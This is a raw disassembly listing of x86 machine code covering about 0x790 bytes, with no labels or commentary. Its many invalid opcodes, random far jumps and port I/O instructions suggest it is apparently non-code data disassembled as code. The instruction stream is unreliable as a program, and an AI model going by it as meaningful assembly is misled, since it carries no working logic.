  405b29:	sub    DWORD PTR [eax-0x87d120c],eax
  405b2f:	retf   
  405b30:	push   0x98698cdd
  405b35:	fs add DWORD PTR gs:[eax],eax
  405b39:	retf   
  405b3a:	fbstp  TBYTE PTR [edx]
  405b3c:	inc    esi
  405b3d:	aad    0x26
  405b3f:	das    
  405b40:	popf   
  405b41:	jmp    0x5dc7:0x7f87dd54
  405b48:	mov    edx,DWORD PTR [esi-0x75]
  405b4b:	mov    eax,0x594d6247
  405b50:	leave  
  405b51:	stc    
  405b52:	clc    
  405b53:	mov    ecx,0x8371eaf6
  405b58:	dec    ecx
  405b59:	in     eax,0x64
  405b5b:	pop    ds
  405b5c:	pop    esp
  405b5d:	sub    DWORD PTR [edx-0x7f],ebp
  405b60:	out    dx,al
  405b61:	scas   al,BYTE PTR es:[edi]
  405b62:	clc    
  405b63:	pusha  
  405b64:	xor    BYTE PTR ds:0x43d21e0d,ah
  405b6a:	lea    ecx,[eax+eiz*8-0x58]
  405b6e:	mov    BYTE PTR [edx+0x52],al
  405b71:	cs inc ecx
  405b73:	data16 fnstcw WORD PTR [edx]
  405b76:	dec    esi
  405b77:	jle    0x405b0d
  405b79:	dec    ecx
  405b7a:	xchg   edi,eax
  405b7b:	dec    esp
  405b7c:	jne    0x405b1f
  405b7e:	xlat   BYTE PTR ds:[ebx]
  405b7f:	mov    ecx,0x42e01a61
  405b84:	mov    ds:0x89ab0153,al
  405b89:	out    0xa6,eax
  405b8b:	sub    eax,0xa3da57d0
  405b90:	lds    ebx,FWORD PTR [ecx]
  405b92:	out    0xc3,eax
  405b94:	or     DWORD PTR [ebx],eax
  405b96:	(bad)  
  405b97:	push   ss
  405b98:	push   ds
  405b99:	inc    ebx
  405b9a:	imul   ecx,DWORD PTR [edi+0x13],0xfeeed2c5
  405ba1:	push   0x15
  405ba3:	xchg   ebx,eax
  405ba4:	jne    0x405bbf
  405ba6:	int    0xcf
  405ba8:	(bad)  
  405ba9:	js     0x405c06
  405bab:	cs mov bh,0x3
  405bae:	mul    DWORD PTR [eax+edi*8+0x22c38468]
  405bb5:	repnz mov edi,0xeefcb49c
  405bbb:	jge    0x405c26
  405bbd:	leave  
  405bbe:	mov    cl,BYTE PTR [edx]
  405bc0:	stos   DWORD PTR es:[edi],eax
  405bc1:	mov    ds:0xf4ee62fc,eax
  405bc6:	call   0x15087ea5
  405bcb:	inc    ecx
  405bcc:	dec    ecx
  405bcd:	adc    al,0x33
  405bcf:	(bad)  
  405bd0:	mov    ebp,DWORD PTR [ecx+0x3a]
  405bd3:	xchg   ecx,eax
  405bd4:	inc    ebx
  405bd5:	fisubr WORD PTR ss:[eax]
  405bd8:	sub    eax,0x3b4c7ce6
  405bdd:	ds sub al,0x3c
  405be0:	int3   
  405be1:	mov    cl,0x69
  405be3:	jnp    0x405be7
  405be5:	jp     0x405bd0
  405be7:	sbb    BYTE PTR [esi],bl
  405be9:	sbb    cl,BYTE PTR [edi+0x2ac706e]
  405bef:	jmp    0x405b79
  405bf1:	xchg   ebp,eax
  405bf2:	ret    0x9ef4
  405bf5:	hlt    
  405bf6:	adc    al,0x20
  405bf8:	out    0x32,eax
  405bfa:	mov    bh,0xca
  405bfc:	cmp    BYTE PTR [ebx+edx*2-0x592f81db],ah
  405c03:	or     al,0x14
  405c05:	push   0xffffffd8
  405c07:	xchg   edx,eax
  405c08:	mov    cl,0x4a
  405c0a:	iret   
  405c0b:	mov    ecx,0xcc7baeb0
  405c10:	push   eax
  405c11:	out    dx,al
  405c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c13:	into   
  405c14:	ss ret 
  405c16:	jl     0x405c7a
  405c18:	bound  esp,QWORD PTR [edx+0x13]
  405c1b:	mov    eax,0xeaa076c6
  405c20:	xchg   ecx,eax
  405c21:	leave  
  405c22:	jg     0xc1e30522
  405c28:	rcl    esi,1
  405c2a:	sub    BYTE PTR [eax-0x7a],dh
  405c2d:	sbb    al,0xb9
  405c2f:	dec    eax
  405c30:	fadd   QWORD PTR [ebp+edx*2+0x46]
  405c34:	dec    eax
  405c35:	lods   eax,DWORD PTR ds:[esi]
  405c36:	ins    DWORD PTR es:[edi],dx
  405c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c38:	add    BYTE PTR [esp+esi*4],cl
  405c3b:	and    BYTE PTR [ecx-0x18693359],ch
  405c41:	or     al,0x9d
  405c43:	inc    esp
  405c44:	xor    esi,ecx
  405c46:	ins    BYTE PTR es:[edi],dx
  405c47:	push   edi
  405c48:	pushf  
  405c49:	mov    eax,0x7ef7048e
  405c4e:	rcr    DWORD PTR [ecx-0x7d6d570f],cl
  405c54:	pop    eax
  405c55:	jo     0x405bec
  405c57:	aaa    
  405c58:	and    BYTE PTR [esi],dh
  405c5a:	fmul   QWORD PTR [esi-0x7d54a18c]
  405c60:	push   edi
  405c61:	ds mov ebx,0x3c52fd11
  405c67:	inc    esp
  405c68:	xchg   ebx,eax
  405c69:	bound  ecx,QWORD PTR gs:[ecx+0x1494f185]
  405c70:	cld    
  405c71:	adc    esi,0xffffffd6
  405c74:	adc    eax,0xc0f296bd
  405c79:	fnstenv [ebx-0x7b3028e7]
  405c7f:	push   edi
  405c80:	int3   
  405c81:	sbb    BYTE PTR ds:0xf5b52046,ch
  405c87:	fild   DWORD PTR [eax]
  405c89:	bound  ebp,QWORD PTR [edi-0x2c]
  405c8c:	mov    al,ds:0xc8651c
  405c91:	(bad)  
  405c92:	out    dx,al
  405c93:	int3   
  405c94:	cld    
  405c95:	sbb    bl,BYTE PTR [ebp+0x4a]
  405c98:	gs jo  0x405c8c
  405c9b:	outs   dx,BYTE PTR ds:[esi]
  405c9c:	ins    DWORD PTR es:[edi],dx
  405c9d:	jo     0x405ce4
  405c9f:	adc    al,BYTE PTR [edi-0x2277412b]
  405ca5:	repz aad 0xf1
  405ca8:	bound  esi,QWORD PTR [esi-0x15]
  405cab:	and    edi,DWORD PTR [ecx]
  405cad:	mov    dl,0x7c
  405caf:	and    ax,bx
  405cb2:	out    dx,al
  405cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cb4:	retf   
  405cb5:	in     al,0xa5
  405cb7:	push   ecx
  405cb8:	std    
  405cb9:	in     eax,0xd8
  405cbb:	fnsave [esi-0x52]
  405cbe:	sti    
  405cbf:	dec    eax
  405cc0:	sahf   
  405cc1:	mov    cl,0x92
  405cc3:	dec    ebx
  405cc4:	inc    ecx
  405cc5:	lds    edx,FWORD PTR [esi+0x38e186d0]
  405ccb:	adc    edx,DWORD PTR [ebp+0x39]
  405cce:	sub    al,0x90
  405cd0:	adc    BYTE PTR ds:0x426eb3a7,dl
  405cd6:	sbb    BYTE PTR [ebp+0x6d],dh
  405cd9:	mov    bl,0x77
  405cdb:	inc    edi
  405cdc:	sbb    ebp,esp
  405cde:	sbb    eax,0xe0c0e59
  405ce3:	int    0x22
  405ce5:	adc    al,0x44
  405ce7:	adc    eax,ecx
  405ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cea:	aam    0x52
  405cec:	inc    eax
  405ced:	mov    edi,0x8a43d464
  405cf2:	add    edi,DWORD PTR [eax+0x7289b3ae]
  405cf8:	jecxz  0x405d55
  405cfa:	mov    esp,0x9501a2f
  405cff:	jns    0x405cd9
  405d01:	outs   dx,BYTE PTR ds:[esi]
  405d02:	ds in  al,dx
  405d04:	sti    
  405d05:	jnp    0x405d32
  405d07:	int    0xcc
  405d09:	xor    BYTE PTR [esi],bl
  405d0b:	fs (bad) 
  405d0d:	das    
  405d0e:	mov    dh,0xef
  405d10:	sbb    BYTE PTR [esi],bh
  405d12:	out    0x16,eax
  405d14:	retf   0x2ba9
  405d17:	mov    esi,0x16560c38
  405d1c:	fisttp DWORD PTR [ebx]
  405d1e:	pop    ebx
  405d1f:	dec    edx
  405d20:	inc    ebp
  405d21:	push   0xffffffd1
  405d23:	(bad)  
  405d24:	fcom   DWORD PTR [eax+esi*2+0x4f]
  405d28:	and    ebp,0x25dff55f
  405d2e:	or     eax,0x3a78db8d
  405d33:	test   BYTE PTR [esi],ah
  405d35:	xchg   ecx,eax
  405d36:	fcomp  DWORD PTR [ebx]
  405d38:	pop    eax
  405d39:	lahf   
  405d3a:	test   al,0xb
  405d3c:	add    BYTE PTR [ecx+0x62fa51f6],bl
  405d42:	pop    edi
  405d43:	stos   BYTE PTR es:[edi],al
  405d44:	cdq    
  405d45:	loop   0x405d53
  405d47:	enter  0xa614,0x44
  405d4b:	lds    edi,FWORD PTR [edx]
  405d4d:	jnp    0x405d39
  405d4f:	jbe    0x405da8
  405d51:	jb     0x405ceb
  405d53:	enter  0x68b4,0x12
  405d57:	into   
  405d58:	push   0x627c23a7
  405d5d:	sbb    bl,ch
  405d5f:	cmp    ecx,edi
  405d61:	stos   BYTE PTR es:[edi],al
  405d62:	sub    ebp,edi
  405d64:	jb     0x405d61
  405d66:	jp     0x405d36
  405d68:	loopne 0x405d26
  405d6a:	adc    ecx,DWORD PTR [ecx]
  405d6c:	outs   dx,BYTE PTR ds:[esi]
  405d6d:	test   BYTE PTR [esi+0x4235fb3c],ah
  405d73:	mov    edx,0xf3be10e0
  405d78:	jecxz  0x405dab
  405d7a:	push   ebx
  405d7b:	pop    ebp
  405d7c:	sub    al,0x63
  405d7e:	inc    ebx
  405d7f:	inc    ebp
  405d80:	fs add ecx,ebx
  405d83:	jno    0x405dd3
  405d85:	adc    al,0x95
  405d87:	or     DWORD PTR [ebx],ebx
  405d89:	add    al,0x21
  405d8b:	xchg   edx,eax
  405d8c:	adc    al,0x7c
  405d8e:	fstp   TBYTE PTR [edx+0x57]
  405d91:	jb     0x405dd6
  405d93:	xchg   ebx,eax
  405d94:	jnp    0x405dd8
  405d96:	hlt    
  405d97:	call   0x62ff66d3
  405d9c:	inc    edi
  405d9d:	popf   
  405d9e:	pop    DWORD PTR [edx+0x49087e80]
  405da4:	ja     0x405d97
  405da6:	sub    eax,0x7bf68583
  405dab:	data16 loope 0x405da6
  405dae:	popa   
  405daf:	ret    
  405db0:	aam    0x93
  405db2:	pop    edx
  405db3:	enter  0xe22a,0x11
  405db7:	cmp    ecx,DWORD PTR [ebx+0x48]
  405dba:	dec    esi
  405dbb:	cdq    
  405dbc:	xor    eax,0xf26978bd
  405dc1:	mov    ds:0x170eca8d,eax
  405dc6:	loope  0x405dbe
  405dc8:	xor    BYTE PTR [edi+0x6e],bh
  405dcb:	cwde   
  405dcc:	cwde   
  405dcd:	aad    0x83
  405dcf:	out    dx,eax
  405dd0:	dec    ebx
  405dd1:	pop    edi
  405dd2:	xor    al,0xfb
  405dd4:	les    eax,FWORD PTR [ebp+eax*8-0x377e2ede]
  405ddb:	mov    fs:0x24f31108,eax
  405de1:	(bad)  
  405de2:	aas    
  405de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405de4:	in     al,dx
  405de5:	pop    ss
  405de6:	add    al,ch
  405de8:	inc    edi
  405de9:	mov    ebx,0xe4e9a218
  405dee:	dec    edx
  405def:	and    BYTE PTR [esi+0x4afbbf4c],cl
  405df5:	mov    ds:0x961b8796,al
  405dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dfb:	lods   al,BYTE PTR ds:[esi]
  405dfc:	je     0x405dd7
  405dfe:	mov    cl,0xda
  405e00:	xchg   edi,eax
  405e01:	push   es
  405e02:	(bad)  
  405e03:	xchg   esi,eax
  405e04:	ds jp  0x405e7e
  405e07:	es js  0x405e1c
  405e0a:	dec    ebx
  405e0b:	xor    DWORD PTR ds:0xc4e9d87c,ecx
  405e11:	icebp  
  405e12:	lods   al,BYTE PTR ds:[esi]
  405e13:	xchg   ebp,eax
  405e14:	sbb    BYTE PTR [esp+ebp*2],dh
  405e17:	or     BYTE PTR [ecx],0xa6
  405e1a:	lahf   
  405e1b:	arpl   WORD PTR [ebp-0x23a684ba],dx
  405e21:	adc    eax,0x30d74c
  405e26:	mov    eax,ds:0x69b9e912
  405e2b:	icebp  
  405e2c:	out    dx,eax
  405e2d:	xor    ch,BYTE PTR [edx-0x5ff0954a]
  405e33:	jbe    0x405de4
  405e35:	xchg   ebx,eax
  405e36:	(bad)  
  405e38:	stos   BYTE PTR es:[edi],al
  405e39:	(bad)  
  405e3a:	and    eax,DWORD PTR [ebx]
  405e3c:	add    dh,ch
  405e3e:	sub    al,0x6a
  405e40:	push   esi
  405e41:	pop    edx
  405e42:	xor    DWORD PTR [ebp+eax*4+0x323712ea],ebx
  405e49:	les    edx,FWORD PTR [eax+esi*4-0x1f]
  405e4d:	push   eax
  405e4e:	aas    
  405e4f:	stc    
  405e50:	sar    BYTE PTR [ecx-0x4d],1
  405e53:	mov    dh,BYTE PTR [ebp-0x1c]
  405e56:	leave  
  405e57:	adc    eax,0x5444c3e
  405e5c:	pop    edx
  405e5d:	mov    al,0xe9
  405e5f:	int    0x58
  405e61:	jmp    0xef344573
  405e66:	mov    dh,0xb5
  405e68:	dec    edi
  405e69:	mov    edx,0x378e64d1
  405e6e:	inc    edx
  405e6f:	push   es
  405e70:	(bad)  
  405e71:	push   ss
  405e72:	adc    dl,dl
  405e74:	dec    edx
  405e75:	fidiv  WORD PTR [edi]
  405e77:	dec    esi
  405e78:	cmp    ch,cl
  405e7a:	dec    esi
  405e7b:	and    edi,DWORD PTR [esi]
  405e7d:	lds    esp,FWORD PTR [edx+0x308715b0]
  405e83:	xchg   BYTE PTR [edx],cl
  405e85:	push   ds
  405e86:	ins    DWORD PTR es:[edi],dx
  405e87:	loop   0x405e6e
  405e89:	dec    esi
  405e8a:	sbb    esi,0x1c
  405e8d:	sti    
  405e8e:	mov    gs,WORD PTR [ecx-0x13]
  405e91:	jmp    0x5b3bee68
  405e96:	pop    esi
  405e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e98:	and    al,0xde
  405e9a:	adc    eax,DWORD PTR cs:[ebx+0x1a8f2fbd]
  405ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ea2:	xlat   BYTE PTR ds:[ebx]
  405ea3:	xchg   esp,eax
  405ea4:	cmp    DWORD PTR [edi+0x2af5a464],edx
  405eaa:	sub    esp,esp
  405eac:	sub    eax,0xb1aec580
  405eb1:	int    0x3c
  405eb3:	mov    al,ds:0x5729259b
  405eb8:	(bad)  
  405eb9:	mov    ch,0x73
  405ebb:	popf   
  405ebc:	xlat   BYTE PTR ds:[ebx]
  405ebd:	sar    DWORD PTR [esi],1
  405ebf:	cmp    BYTE PTR [edx+0x33],0xec
  405ec3:	call   0x88fedeb0
  405ec8:	cwde   
  405ec9:	in     eax,dx
  405eca:	(bad)  
  405ecc:	popa   
  405ecd:	loop   0x405eb0
  405ecf:	in     eax,dx
  405ed0:	dec    edi
  405ed1:	mov    edx,0xd5affe4d
  405ed6:	mov    cs,WORD PTR [ebx]
  405ed8:	add    bh,ah
  405eda:	or     al,0x62
  405edc:	mov    ebx,0xa244a8a6
  405ee1:	ret    0xb0b4
  405ee4:	je     0x405e7b
  405ee6:	or     BYTE PTR [eax+esi*8+0x5],0xb5
  405eeb:	and    eax,0xefcb25b2
  405ef0:	sbb    DWORD PTR [ecx-0xab1c7a0],edi
  405ef6:	sub    al,0x6a
  405ef8:	ror    BYTE PTR [ecx-0x7],cl
  405efb:	push   esi
  405efc:	dec    esp
  405efd:	adc    esp,DWORD PTR [edx-0x54]
  405f00:	dec    BYTE PTR [ebx-0x2d7b188c]
  405f06:	xchg   ebx,eax
  405f07:	out    dx,eax
  405f08:	sbb    al,0xfe
  405f0a:	pop    ds
  405f0b:	mov    bl,0x79
  405f0d:	and    ah,ch
  405f0f:	loopne 0x405f3b
  405f11:	test   eax,0x78c6ce2
  405f16:	xchg   edi,eax
  405f17:	dec    ecx
  405f18:	dec    BYTE PTR [ebx-0x69caf3a7]
  405f1e:	xor    DWORD PTR [ebx+0x69],edx
  405f21:	aaa    
  405f22:	jge    0x405f36
  405f24:	mov    dh,0x1b
  405f26:	cmc    
  405f27:	cwde   
  405f28:	(bad)  
  405f29:	stos   DWORD PTR es:[edi],eax
  405f2a:	jecxz  0x405ee6
  405f2c:	sbb    eax,0xfe470f46
  405f31:	mov    ebx,0xb931154
  405f36:	mov    cs,WORD PTR [ecx+eiz*2]
  405f39:	inc    esi
  405f3a:	aam    0x7
  405f3c:	adc    eax,0x90d82526
  405f41:	ret    
  405f42:	jle    0x405edc
  405f44:	ins    BYTE PTR es:[edi],dx
  405f45:	pop    ss
  405f46:	and    edi,ebx
  405f48:	sub    ah,BYTE PTR [ecx]
  405f4a:	pop    edx
  405f4b:	inc    esp
  405f4c:	ins    BYTE PTR es:[edi],dx
  405f4d:	push   edx
  405f4e:	mov    dl,0x3
  405f50:	xor    ebp,eax
  405f52:	or     cl,BYTE PTR [esi]
  405f54:	sub    eax,0xbfb5aafb
  405f59:	scas   al,BYTE PTR es:[edi]
  405f5a:	pop    edx
  405f5b:	ror    BYTE PTR [ebp+0x24],cl
  405f5e:	pop    esp
  405f5f:	sbb    ecx,0xffffff87
  405f62:	inc    edi
  405f63:	stos   DWORD PTR es:[edi],eax
  405f64:	pop    ebx
  405f65:	aad    0xf7
  405f67:	mov    cl,0xb2
  405f69:	fdiv   DWORD PTR [ecx]
  405f6b:	cdq    
  405f6c:	or     cl,BYTE PTR ds:0x832a0ecb
  405f72:	pop    es
  405f73:	sub    DWORD PTR [edi-0x4a],ecx
  405f76:	mov    edi,DWORD PTR [ebx+0x74f2cf1e]
  405f7c:	popa   
  405f7d:	ret    
  405f7e:	inc    ecx
  405f7f:	in     eax,dx
  405f80:	test   BYTE PTR [edi+0x2c],dh
  405f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f84:	and    eax,edx
  405f86:	shr    DWORD PTR [edi],cl
  405f88:	rcl    edx,cl
  405f8a:	dec    edi
  405f8b:	ror    DWORD PTR [eax+0x33780c4a],cl
  405f91:	mov    ds:0x8dab38fb,al
  405f96:	sub    eax,0x68d34c54
  405f9b:	and    DWORD PTR [ebp-0x6a172b6c],ebp
  405fa1:	cmp    esp,DWORD PTR [ebx+0x32]
  405fa4:	stc    
  405fa5:	add    eax,0x60d42d7
  405faa:	jbe    0x406019
  405fac:	outs   dx,DWORD PTR ds:[esi]
  405fad:	cmp    DWORD PTR [ebx-0x2c],ebp
  405fb0:	cmp    al,BYTE PTR [edi+eiz*1-0x68]
  405fb4:	sub    eax,0xa95ea4d5
  405fb9:	pop    es
  405fba:	and    BYTE PTR [ebp+0x72],ch
  405fbd:	mov    BYTE PTR [edx+0xa3ecb7d],ah
  405fc3:	enter  0x54be,0x16
  405fc7:	fld    QWORD PTR [esp+esi*4+0xd]
  405fcb:	mov    ebx,0x64d7b0bf
  405fd0:	add    eax,esp
  405fd2:	or     DWORD PTR [ecx+eax*1+0x16],eax
  405fd6:	(bad)  
  405fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fd8:	inc    ebx
  405fd9:	xor    bl,BYTE PTR [edx+0x54]
  405fdc:	arpl   WORD PTR [edx],bx
  405fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fdf:	and    BYTE PTR [ebx+0x56],ch
  405fe2:	test   eax,0x6419b024
  405fe7:	jl     0x405faf
  405fe9:	and    al,0x16
  405feb:	push   eax
  405fec:	arpl   WORD PTR [eax-0xf],dx
  405fef:	xor    DWORD PTR [ebx+0x70],ecx
  405ff2:	icebp  
  405ff3:	(bad)  [ebx-0x11f0af94]
  405ff9:	rcr    DWORD PTR [esp+eiz*4+0x52],1
  405ffd:	out    0xf5,al
  405fff:	add    DWORD PTR [ecx+esi*4+0x3e],esi
  406003:	shr    BYTE PTR [ebx],1
  406005:	(bad)  
  406006:	sar    BYTE PTR [esi+0x21],cl
  406009:	jbe    0x406063
  40600b:	or     ebp,edi
  40600d:	pushf  
  40600e:	sbb    DWORD PTR [esi],eax
  406010:	or     ecx,edx
  406012:	sub    esi,DWORD PTR [esi]
  406014:	and    ch,BYTE PTR [esi+ebx*1-0x3e]
  406018:	(bad)  
  406019:	pushf  
  40601a:	mov    al,0xb0
  40601c:	cmp    al,0x8d
  40601e:	sbb    bl,dh
  406020:	iret   
  406021:	jp     0x406089
  406023:	arpl   sp,dx
  406025:	mov    ecx,0x3fe07a0e
  40602a:	dec    ecx
  40602b:	fdiv   QWORD PTR [edi+0x51]
  40602e:	push   ebp
  40602f:	inc    edx
  406030:	mov    ecx,0x57e8c88f
  406035:	mov    ch,0xfe
  406037:	pushf  
  406038:	mov    ebp,0x3b95ee49
  40603d:	sub    ebp,DWORD PTR [esi+eax*2-0x71437116]
  406044:	sbb    BYTE PTR [edx+0x7],al
  406047:	sbb    edx,esp
  406049:	jnp    0x406092
  40604b:	imul   esp,DWORD PTR [esi-0x7664a120],0xfe91f922
  406055:	mov    dh,0xfd
  406057:	pop    ebp
  406058:	std    
  406059:	and    eax,0x7c094148
  40605e:	repnz mov al,ds:0x378f24b1
  406064:	mov    bl,0x25
  406066:	aam    0x38
  406068:	jl     0x406034
  40606a:	std    
  40606b:	xor    cl,BYTE PTR [ecx+0x38e71353]
  406071:	jae    0x406055
  406073:	dec    ebp
  406074:	popf   
  406075:	mov    dh,BYTE PTR [esi+0x11071f6c]
  40607b:	cmp    eax,0x30a4dd96
  406080:	data16 and bl,BYTE PTR [edx+0x1011292e]
  406087:	adc    DWORD PTR [esp+ebx*2+0x72cf1eda],edi
  40608e:	dec    ecx
  40608f:	adc    dl,BYTE PTR [edx-0x71]
  406092:	push   esp
  406093:	mov    ebx,0xb3c6bf2f
  406098:	jecxz  0x406034
  40609a:	iret   
  40609b:	dec    esi
  40609c:	and    ah,BYTE PTR [esi+eiz*1]
  40609f:	jecxz  0x40607a
  4060a1:	fwait
  4060a2:	push   ecx
  4060a3:	jmp    0x1d24:0xd6862583
  4060aa:	jnp    0x406062
  4060ac:	jmp    0xd32fe368
  4060b1:	retf   
  4060b2:	lock (bad) 
  4060b4:	push   ss
  4060b5:	or     edi,DWORD PTR ds:0xff77c2d0
  4060bb:	or     DWORD PTR [edx+ebp*2+0x62],esp
  4060bf:	shr    ebp,0x9e
  4060c2:	adc    al,0xd
  4060c4:	and    DWORD PTR [edx],0x3e
  4060c7:	pop    ds
  4060c8:	inc    esp
  4060c9:	adc    eax,0x9e04ca53
  4060ce:	clc    
  4060cf:	push   0xd8e82114
  4060d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d5:	pop    esp
  4060d6:	mov    ebx,0x7fba9cc7
  4060db:	pop    ss
  4060dc:	daa    
  4060dd:	jl     0x40606c
  4060df:	mov    ch,0x73
  4060e1:	jge    0x406117
  4060e3:	fxch   st(7)
  4060e5:	(bad)  [ebp+ebx*1-0x62]
  4060e9:	mov    ah,0x0
  4060eb:	rcl    DWORD PTR [edx+0x5a],cl
  4060ee:	pop    es
  4060ef:	push   cs
  4060f0:	mov    cl,0xaa
  4060f2:	outs   dx,DWORD PTR ds:[esi]
  4060f3:	in     al,0xfd
  4060f5:	dec    esp
  4060f6:	mov    eax,0x7368843e
  4060fb:	(bad)  
  4060fc:	jne    0x40617a
  4060fe:	mov    ah,al
  406100:	bound  esi,QWORD PTR [eax+edi*2-0x28834cf0]
  406107:	mov    ecx,0x2a00d24e
  40610c:	pop    eax
  40610d:	and    DWORD PTR [edi+ecx*4+0x47],0xd6fc176d
  406115:	xor    ah,BYTE PTR [eax+0x20d08bcd]
  40611b:	add    ch,BYTE PTR [edi-0x2edd4fb3]
  406121:	imul   eax,DWORD PTR [edi-0x5c],0xffffffa1
  406125:	sub    ebp,DWORD PTR [esi]
  406127:	mov    eax,ds:0x735c2b87
  40612c:	test   ch,bh
  40612e:	mov    esi,0x8d0ce8ee
  406133:	sub    eax,0x4e51a23
  406138:	cmp    esi,DWORD PTR [esi-0x5d0dac9a]
  40613e:	nop
  40613f:	jns    0x4060c9
  406141:	(bad)  
  406142:	fbstp  TBYTE PTR [edi]
  406144:	arpl   WORD PTR [esi-0x411d8650],ax
  40614a:	jne    0x406160
  40614c:	loopne 0x406110
  40614e:	jge    0x4060fc
  406150:	mov    eax,0xc3325024
  406155:	enter  0xdf23,0xd8
  406159:	pop    ss
  40615a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40615b:	into   
  40615c:	push   ds
  40615d:	ins    BYTE PTR es:[edi],dx
  40615e:	mov    al,0xa0
  406161:	ds dec ecx
  406163:	or     al,0x3b
  406165:	inc    edi
  406166:	fisttp DWORD PTR [esi+0xb9512e2]
  40616c:	add    al,0xc8
  40616e:	mov    esp,0x66a6c7c
  406173:	push   ebp
  406174:	out    dx,al
  406175:	push   es
  406176:	loop   0x4061aa
  406178:	jge    0x4061ec
  40617a:	into   
  40617b:	and    DWORD PTR [edx-0x61],ebp
  40617e:	pop    esp
  40617f:	inc    eax
  406180:	das    
  406181:	jge    0x40611b
  406183:	int    0x1d
  406185:	mov    dl,0xe5
  406187:	repz xor ah,BYTE PTR [edi+ebp*4+0x4626caf6]
  40618f:	add    ch,BYTE PTR [esi]
  406191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406192:	mov    bl,0x77
  406194:	pusha  
  406195:	cmp    BYTE PTR [eax+0x602befcd],0x2f
  40619c:	inc    ebx
  40619d:	xchg   BYTE PTR [esi+ebx*8],dh
  4061a0:	push   ebx
  4061a1:	cmp    al,0x22
  4061a3:	scas   eax,DWORD PTR es:[edi]
  4061a4:	mov    ds:0x48e7fda9,eax
  4061a9:	(bad)  
  4061ab:	xchg   edi,eax
  4061ac:	mov    dl,0xc1
  4061ae:	adc    al,0x63
  4061b0:	sbb    al,0x6
  4061b2:	std    
  4061b3:	pop    ds
  4061b4:	popf   
  4061b5:	(bad)  
  4061b7:	xor    cl,ah
  4061b9:	aas    
  4061ba:	inc    esp
  4061bb:	aam    0x9
  4061bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061be:	push   ebx
  4061bf:	or     al,0x8e
  4061c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061c2:	jle    0x406198
  4061c4:	xchg   esp,eax
  4061c5:	sbb    DWORD PTR [edi-0x57],edx
  4061c8:	mov    dh,0x9c
  4061ca:	retf   0x92e3
  4061cd:	repz call 0x8ad909ec
  4061d3:	popf   
  4061d4:	pop    esp
  4061d5:	cmp    DWORD PTR [edi+ebp*1],eax
  4061d8:	scas   eax,DWORD PTR es:[di]
  4061da:	mov    dl,0x7c
  4061dc:	ss cmc 
  4061de:	ficomp DWORD PTR [edx-0x74]
  4061e1:	outs   dx,BYTE PTR ds:[esi]
  4061e2:	inc    esp
  4061e3:	xor    DWORD PTR [ebx],eax
  4061e5:	ins    DWORD PTR es:[edi],dx
  4061e6:	imul   esi,DWORD PTR [esi+0x5fc0c9a0],0x40b3f8cd
  4061f0:	ror    BYTE PTR [ebp+0x7d],0xe0
  4061f4:	shl    BYTE PTR [edi-0x7a085b36],cl
  4061fa:	jnp    0x40617d
  4061fc:	push   ebx
  4061fd:	xor    bh,BYTE PTR [edx+0x23]
  406200:	cmc    
  406201:	call   0x957d9619
  406206:	call   0x805b:0xd96f6362
  40620d:	mov    al,ds:0x68d672e0
  406212:	push   edx
  406213:	xor    cl,cl
  406215:	into   
  406216:	jo     0x4061b5
  406218:	adc    al,dl
  40621a:	mov    dh,BYTE PTR [ecx]
  40621c:	fs sbb eax,0x4daf2d9
  406222:	sub    DWORD PTR [esi+0x653f3217],0x1b
  406229:	xchg   esi,eax
  40622a:	xor    al,0x4
  40622c:	popa   
  40622d:	jge    0x40625d
  40622f:	or     al,0x5e
  406231:	mov    eax,0x960ee04f
  406236:	in     eax,0xd5
  406238:	pop    edi
  406239:	and    esi,ecx
  40623b:	cmp    eax,0xc16d9300
  406240:	jle    0x406208
  406242:	stc    
  406243:	add    BYTE PTR [edi-0x7c8e4636],cl
  406249:	clc    
  40624a:	jns    0x406282
  40624c:	add    BYTE PTR [esi-0x1b319ea9],bh
  406252:	paddq  mm2,QWORD PTR [ebx-0x60]
  406256:	inc    ecx
  406257:	inc    edx
  406258:	test   DWORD PTR [esi+edi*8],eax
  40625b:	sbb    bl,BYTE PTR gs:[edi-0x3e03ce70]
  406262:	lods   eax,DWORD PTR ds:[esi]
  406263:	jae    0x406243
  406265:	pusha  
  406266:	sub    eax,DWORD PTR [edi-0x2ce409cc]
  40626c:	pop    es
  40626d:	(bad)  
  40626e:	ins    BYTE PTR es:[edi],dx
  40626f:	(bad)  
  406270:	mov    edx,0x4022d6cf
  406275:	mov    dl,0xf2
  406277:	add    ecx,esi
  406279:	pop    edi
  40627a:	call   0xbb35f85
  40627f:	xlat   BYTE PTR ds:[ebx]
  406280:	cld    
  406281:	into   
  406282:	mov    al,0x96
  406284:	retf   
  406285:	out    0xd5,eax
  406287:	icebp  
  406288:	inc    ecx
  406289:	in     eax,dx
  40628a:	or     al,0x2a
  40628c:	test   al,0x4
  40628e:	imul   ebx,esp,0x3d5821d5
  406294:	add    BYTE PTR [ebx],0x1a
  406297:	mov    esp,0xbb87f866
  40629c:	fisub  WORD PTR [edx-0x6a7a6038]
  4062a2:	mov    edx,edx
  4062a4:	bound  edx,QWORD PTR [ecx]
  4062a6:	sbb    al,0xfb
  4062a8:	push   ebx
  4062a9:	push   0xffffffcc
  4062ab:	pushf  
  4062ac:	fidiv  WORD PTR [esi-0x31]
  4062af:	outs   dx,DWORD PTR ds:[esi]
  4062b0:	pop    eax
  4062b1:	jle    0x4062ed
  4062b3:	fadd   st,st(5)
  4062b5:	push   es
  4062b6:	mov    gs,ebp
  4062b8:	call   0x45f5:0xf061a1d6
